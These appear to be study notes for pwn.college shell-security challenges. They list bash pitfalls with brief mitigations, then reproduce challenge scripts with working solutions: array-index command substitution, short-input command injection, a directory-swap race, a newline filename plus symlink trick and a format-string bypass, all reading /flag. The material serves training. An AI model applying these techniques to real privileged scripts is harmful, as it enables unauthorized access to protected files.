# Module 1
## Environment Attack
### Vuln:
- abuse `PATH` variable

### Mit: 
- use absolute path in script (`unset PATH` does not solve the problem) 

## Race Condition, Symlink Attack
- Do not use `$0`.

---

# Module 2
## Shell Expansion
### Vuln:
- lacking quotes(examples: `$1`, `[A-Z]`, `$*`)

### Mit:
- use quotes

## Test Injection + Expansion
### Vuln:
- ```sh
  [ $1 -eq "$CHALLENGE" ]

## declare not safe
### Vuln:
- ```sh
  declare -- "$1"="$2"`
- abuse `IFS` variable

### Mit: 
- try sanitizing arguments

## Array Attack, Process Substitution, Abusing -eq
- `a[\$(cat /flag)]`

## Race Condition(again)
- Do not use `$0`.

## Subshell Attack with extra bracket
- `a[\$(</flag))]` (extra ')')

---

# Module 3
## Rhythm of Restriction

```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

read INPUT < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$INPUT"
```

### Solution
```sh
/challenge/run /bin/bash
$@
```

## Your Misplaced Memories
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

# This neat trick was generously contributed by WilyWizard!

PATH=/usr/bin

WORKDIR=$(mktemp -d)
[ -n "$WORKDIR" ] || exit 1
cd $WORKDIR

doit() {
	echo -n ""
	read INPUT < <(head -n1 | tr -cd "[\-~]")
	eval "$INPUT"
}

doit
```

### Vulnerability
- Executing user input.

### Solution
- Create a directory, call `/challenge/run`, while `read` is waiting for an input remove the directory and create a vulnerable script with the same name. Feed `~-` to `read`, `eval OLDPWD` is executed which triggers our vulnerable script. 




## Precision of Parameters
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

# Inspired by Orange Tsai

PATH=/usr/bin

WORKDIR=$(mktemp -p $(mktemp -d /tmp/XXXXXXX) -d XXXXXXXX) || exit 1
cd $WORKDIR

# some cleanup
HOME=$WORKDIR
unset OLDPWD # thanks, WilyWizard

cp /flag $WORKDIR
read -r INPUT
[ "${#INPUT}" -gt 5 ] && exit 2
sh -c "$INPUT" < /dev/null
```

### Vulnerability
- Command Injection

### Solution
```sh
/challenge/run
cat *
```


## Brevity's Enigma
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

# Inspired by Orange Tsai

PATH=/usr/bin

WORKDIR=$(mktemp -p $(mktemp -d /tmp/XXXXXXX) -d XXXXXXXX) || exit 1
cd $WORKDIR

# some cleanup
HOME=$WORKDIR
unset OLDPWD

cp /flag .

while [ "$INPUT" != "exit" ]
do
	read -r INPUT
	[ "${#INPUT}" -gt 4 ] && exit 2
	sh -c "$INPUT" < /dev/null 2>/dev/null
done
```

### Vulnerability
- Command Injection

### Solution
```sh
/challenge/run
od *
```



## Essense of Economy
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

# Inspired by Orange Tsai

PATH=/usr/bin

WORKDIR=$(mktemp -p $(mktemp -d /tmp/XXXXXXX) -d XXXXXXXX) || exit 1
cd $WORKDIR

# some cleanup
HOME=$WORKDIR
unset OLDPWD

while [ "$INPUT" != "exit" ]
do
	read -r INPUT
	[ "${#INPUT}" -gt 5 ] && exit 2
	sh -c "$INPUT" < /dev/null 2>/dev/null
done
```

### Vulnerability
- Command Injection

### Solution
```sh
echo cat /flag > /tmp/a
chmod +x /tmp/a
/challenge/run
/t*/a
```

## Mirage of Minimalism
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

# Inspired by Orange Tsai

PATH=/usr/bin

WORKDIR=$(mktemp -p $(mktemp -d /tmp/XXXXXXX) -d XXXXXXXX) || exit 1
cd $WORKDIR

# some cleanup
HOME=$WORKDIR
unset OLDPWD

while [ "$INPUT" != "exit" ]
do
	read -r INPUT
	[ "${#INPUT}" -gt 4 ] && exit 2
	sh -c "$INPUT" < /dev/null 2>/dev/null
done
```

### Vulnerability
- Command Injection

### Solution
```sh
echo cat /flag > /tmp/p
chmod +x /tmp/p
/challenge/run
/*/p
```



# Module 4
## Dance of the Disguised
```sh
#!/usr/bin/env -iS /opt/pwn.college/sh

PATH=/usr/bin
[ -n "$1" ] || exit 1

WORKDIR=$(mktemp -d) || exit 2
cp -rL "$1"/* $WORKDIR/files
cd $WORKDIR/files

# make sure there weren't linking shenanegans
grep -q "{" notflag* && exit 3

ls notflag* | while read FILE
do
	echo "###### FILE: $FILE #######"
	cat "$FILE"
done
```

### Vulnerability
`ls notflag* | while read FILE` (pitfall `#1`)

### Solution
- Create file with `\n` in it
```sh
ln -s /flag a
touch $'notflag\na'
```


## Script of the Silent
```sh
#!/usr/bin/env -iS /opt/pwn.college/bash

PATH=/usr/bin

[ -n "$1" ] || exit 1
[ "$(realpath "$1")" != "/" ] || exit 1
[ "$(realpath "$1")" != "/flag" ] || exit 2

printf -v BACKUP_DIR "$1"
tar cvf /tmp/backup "$BACKUP_DIR"
```

### Vulnerability
- format string should be provided by user (pitfall `#32`)

### Solution
```sh
/challenge/run %s/flag
```




